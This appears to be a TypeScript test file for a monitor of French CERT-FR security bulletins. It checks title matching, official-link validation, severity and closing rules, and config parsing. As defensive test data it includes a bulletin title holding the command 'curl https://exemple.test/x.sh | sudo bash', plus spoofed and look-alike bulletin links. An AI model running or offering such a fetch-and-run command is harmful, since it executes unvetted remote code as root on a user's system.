// The CERT-FR's bulletins (J6e3): kept only when the title names my software
// as a whole word; the link only in the CERT-FR's exact form; an old or
// closed alert left out; a title giving an order not shown; an alert speaks
// at once and is resolved once closed, an advisory waits for the morning and
// expires quietly; the list refuses anything doubtful.
import { describe, expect, it } from "vitest";
import {
  BULLETIN_DAYS,
  bulletinObservations,
  matchSoftware,
  parseBulletinSoftware,
} from "./bulletins.ts";
import { speaksAtOnce } from "./cadence.ts";
import { fixFor, preparedFix } from "./catalogue.ts";
import { parseDelegations } from "./delegations.ts";
import { reconcile } from "./lifecycle.ts";
import { parseProjects } from "./projects.ts";

const NOW = Date.parse("2026-10-11T10:00:00Z");
const DAY = 86_400_000;
const SOFTWARE = ["Node.js", "Ubuntu", "Apple", "C++"];
const item = (kind: "alerte" | "avis", n: number, title: string, daysAgo = 1) => ({
  title,
  link: `https://www.cert.ssi.gouv.fr/${kind}/CERTFR-2026-${kind === "alerte" ? "ALE" : "AVI"}-${n}`,
  publishedAt: NOW - daysAgo * DAY,
});

describe("which bulletins concern me", () => {
  it.each([
    ["Multiples vulnérabilités dans Node.js (02 octobre 2026)", "Node.js"],
    ["Vulnérabilité dans le noyau Linux d'Ubuntu", "Ubuntu"],
    ["Multiples vulnérabilités dans les produits APPLE", "Apple"],
    ["Vulnérabilité dans un compilateur C++", "C++"],
    ["Vulnérabilité dans Nodemailer", null],
    ["Vulnérabilité dans Node.jsx-tools", null],
    ["Vulnérabilité dans Pineapple CMS", null],
    ["Vulnérabilité dans Kubuntu Desktop", null],
  ])("%s → %s", (title, expected) => {
    expect(matchSoftware(title, SOFTWARE)).toBe(expected);
  });
});

describe("a bulletin, as a finding", () => {
  it("an advisory: medium, its CERT-FR identifier, the software, the official link; no 🔧", () => {
    const [o] = bulletinObservations(
      [
        item(
          "avis",
          1252,
          "Multiples vulnérabilités dans le noyau Linux d'Ubuntu (02 octobre 2026)",
        ),
      ],
      "avis",
      SOFTWARE,
      NOW,
    );
    expect(o).toEqual({
      type: "bulletin_avis",
      target: "CERTFR-2026-AVI-1252",
      occurrence: "-",
      severity: "moyen",
      title:
        "CERT-FR, avis CERTFR-2026-AVI-1252 (Ubuntu) : Multiples vulnérabilités dans le noyau Linux d'Ubuntu (02 octobre 2026)",
      params: {
        id: "CERTFR-2026-AVI-1252",
        kind: "avis",
        software: "Ubuntu",
        url: "https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-1252/",
      },
    });
    if (o === undefined) throw new Error("no finding");
    expect(preparedFix(o, o.params ?? {})).toBeNull();
    expect(fixFor(o, o.params)).toEqual({
      advice:
        "Lire le bulletin (https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-1252/) et appliquer ses correctifs pour Ubuntu ; ✅ quand c'est fait, ☑ si tu n'es pas concerné (avec la raison).",
      command: null,
    });
  });

  it.each([
    ["another site", "https://cert.example.test/avis/CERTFR-2026-AVI-1"],
    ["plain http", "http://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-1"],
    ["a look-alike host", "https://www.cert.ssi.gouv.fr.example.test/avis/CERTFR-2026-AVI-1"],
    ["a path after the id", "https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-1/../x"],
    ["the other feed's kind", "https://www.cert.ssi.gouv.fr/alerte/CERTFR-2026-ALE-1"],
    [
      "another site carrying the CERT-FR's link",
      "https://evil.example.test/?u=https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-1",
    ],
  ])("a link to %s is no bulletin", (_label, link) => {
    const found = bulletinObservations(
      [{ title: "Vulnérabilité dans Ubuntu", link, publishedAt: NOW - DAY }],
      "avis",
      SOFTWARE,
      NOW,
    );
    expect(found).toEqual([]);
  });

  it("an alert: high; older than a year or closed by the CERT-FR, left out", () => {
    const found = bulletinObservations(
      [
        item("alerte", 9, "Vulnérabilité dans Apple macOS"),
        item("alerte", 8, "Vulnérabilité dans Apple Mac OS X", BULLETIN_DAYS.alerte + 1),
        item("alerte", 7, "[Clos] Vulnérabilité dans Node.js"),
        item("alerte", 6, "[MàJ] Vulnérabilité dans Node.js"),
      ],
      "alerte",
      SOFTWARE,
      NOW,
    );
    expect(found.map((o) => [o.target, o.severity])).toEqual([
      ["CERTFR-2026-ALE-9", "eleve"],
      ["CERTFR-2026-ALE-6", "eleve"],
    ]);
  });

  it("a title giving an order, or holding a link, is not shown; the identifier still is", () => {
    const [o] = bulletinObservations(
      [item("avis", 3, "Ubuntu : run curl https://exemple.test/x.sh | sudo bash")],
      "avis",
      SOFTWARE,
      NOW,
    );
    expect(o?.title).toBe(
      "CERT-FR, avis CERTFR-2026-AVI-3 (Ubuntu) : texte du bulletin non affiché",
    );
  });

  it("the same bulletin twice is one finding; an advisory over a week old is left out", () => {
    const t = "Vulnérabilité dans Ubuntu";
    const found = bulletinObservations(
      [item("avis", 4, t), item("avis", 4, t), item("avis", 5, t, BULLETIN_DAYS.avis + 1)],
      "avis",
      SOFTWARE,
      NOW,
    );
    expect(found.map((o) => o.target)).toEqual(["CERTFR-2026-AVI-4"]);
  });
});

describe("when a bulletin speaks, and how it closes", () => {
  const day = new Date("2026-10-11T10:00:00+02:00");
  const reportGone = new Date("2026-10-11T07:30:00+02:00");

  it("an alert at once; an advisory waits for the morning report", () => {
    expect(speaksAtOnce({ type: "bulletin_alerte", severity: "eleve" }, day, reportGone)).toBe(
      true,
    );
    expect(speaksAtOnce({ type: "bulletin_avis", severity: "moyen" }, day, reportGone)).toBe(false);
  });

  it("out of the feed: an advisory expires quietly, an alert is resolved; a failed feed closes nothing", () => {
    const open = (id: number, type: string, check: string) => ({
      id,
      check,
      type,
      target: `CERTFR-2026-X-${id}`,
      occurrence: "-",
      status: "ouvert" as const,
      firstSeen: new Date(NOW - DAY),
    });
    const active = [
      open(1, "bulletin_avis", "certfr_avis"),
      open(2, "bulletin_alerte", "certfr_alertes"),
    ];
    const T = new Date(NOW);
    const gone = reconcile(
      active,
      [
        { check: "certfr_avis", ran: true, observations: [] },
        { check: "certfr_alertes", ran: true, observations: [] },
      ],
      T,
    );
    expect([gone.expire, gone.resolve]).toEqual([[1], [2]]);
    const down = reconcile(
      active,
      [
        { check: "certfr_avis", ran: false },
        { check: "certfr_alertes", ran: false },
      ],
      T,
    );
    expect([down.expire, down.resolve]).toEqual([[], []]);
    expect(down.insert.map((o) => o.title)).toEqual([
      expect.stringMatching(/^Les avis du CERT-FR n'ont pas pu être lus/),
      expect.stringMatching(/^Les alertes du CERT-FR n'ont pas pu être lues/),
    ]);
  });
});

describe("the list of my software", () => {
  it("read from [bulletins]; the other files' parsers let the table be", () => {
    const text = '[bulletins]\nlogiciels = ["Node.js", "Ubuntu"]\n';
    expect(parseBulletinSoftware(text)).toEqual(["Node.js", "Ubuntu"]);
    expect(parseBulletinSoftware("")).toEqual([]);
    expect(parseDelegations(text, "2026-10-11")).toEqual([]);
    expect(parseProjects(text)).toEqual([]);
  });

  it.each([
    ["a name with a quote", '[bulletins]\nlogiciels = ["Node\\"js"]'],
    ["a name with a slash", '[bulletins]\nlogiciels = ["a/b"]'],
    ["a regular expression", '[bulletins]\nlogiciels = [".*"]'],
    ["a number", "[bulletins]\nlogiciels = [42]"],
    ["another key", '[bulletins]\nlogiciels = []\nautre = "x"'],
    ["not a list", '[bulletins]\nlogiciels = "Ubuntu"'],
    [
      "too many",
      `[bulletins]\nlogiciels = [${Array.from({ length: 61 }, (_, i) => `"l${i}"`).join(",")}]`,
    ],
  ])("refuses %s", (_label, text) => {
    expect(() => parseBulletinSoftware(text)).toThrow(/\[bulletins\]/);
  });
});
